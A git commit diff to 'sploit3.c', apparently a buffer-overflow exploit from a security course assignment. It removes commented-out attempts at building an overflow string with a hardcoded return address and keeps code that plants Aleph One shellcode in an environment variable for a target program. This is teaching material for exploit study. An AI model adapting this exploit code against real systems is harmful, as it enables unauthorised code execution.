7edd30088da4732398229d780b52f06c5b0806cf
pandaxuCESO <49774769+30PandaX@users.noreply.github.com>
2021-12-09 12:15:54 -0500

    Update sploit3.c

--- sploits/sploit3.c
+++ sploits/sploit3.c
@@ -11,27 +11,7 @@ int main(void)
 {
   char *args[3]; 
   char *env[1];
-
-  // char str[20];
-  // memset(str, 0, 20);
-
-  // for (int i = 0; i < 16; i++)
-  // {
-  // 	strcat(str, "A");
-  // }
-  // // Segfault:
-  // // strcat(str, "\x97\xff\xff\xbf");
-  // // env: 0xbfffff97:	0xdb31c031
-
-  // strcat(str, "\xe9\xff\xff\xbf");
-
-  // args[0] = TARGET;
-  // // max input size is 4 * 5 = 20
-  // args[1] = str;
-  // args[2] = NULL;
   
-  // env[0] = shellcode;
-
   char *preface = "shellcode=";
   char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+16);
   strcat(envvar, preface);
@@ -49,5 +29,4 @@ int main(void)
 
   return 0;
 }
-
 
